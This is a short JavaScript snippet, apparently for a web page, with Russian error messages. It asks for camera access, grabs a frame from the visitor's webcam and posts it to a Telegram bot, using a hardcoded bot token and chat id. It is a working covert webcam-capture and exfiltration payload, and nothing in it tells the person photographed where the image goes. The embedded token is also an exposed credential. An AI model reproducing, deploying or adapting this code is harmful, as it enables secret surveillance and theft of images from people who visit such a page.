navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  const video = document.getElementById('cameraFeed');
  video.srcObject = stream;

  const canvas = document.createElement('canvas');
  const context = canvas.getContext('2d');

  function sendImageToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', '1494753646');
    formData.append('photo', blob, 'photo.png');

    fetch('https://api.telegram.org/bot6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw/sendPhoto', {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Ошибка:', error));
  }

  video.addEventListener('loadeddata', () => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(sendImageToTelegram, 'image/png');
  });
})
.catch(error => {
  console.error('Ошибка при получении доступа к камере:', error);
});
